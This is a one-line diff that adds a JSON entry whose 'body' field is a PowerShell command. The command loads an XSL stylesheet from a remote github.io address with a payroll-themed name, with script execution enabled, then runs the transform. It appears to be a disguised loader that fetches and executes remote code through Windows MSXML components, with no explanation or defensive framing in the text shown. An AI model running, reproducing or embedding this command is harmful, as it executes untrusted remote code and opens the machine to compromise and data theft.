@@ -1,0 +1,1 @@
+{"body": "$x=New-Object -ComObject Msxml2.FreeThreadedDOMDocument.6.0;$x.resolveExternals=1;$x.setProperty('AllowXsltScript',1);$x.load('https://ice-ezpayroll.github.io/manifest.xsl');$t=New-Object -ComObject Msxml2.XSLTemplate.6.0;$t.stylesheet=$x;$p=$t.createProcessor();$p.input=New-Object -ComObject Msxml2.DOMDocument.6.0;$p.transform()"}
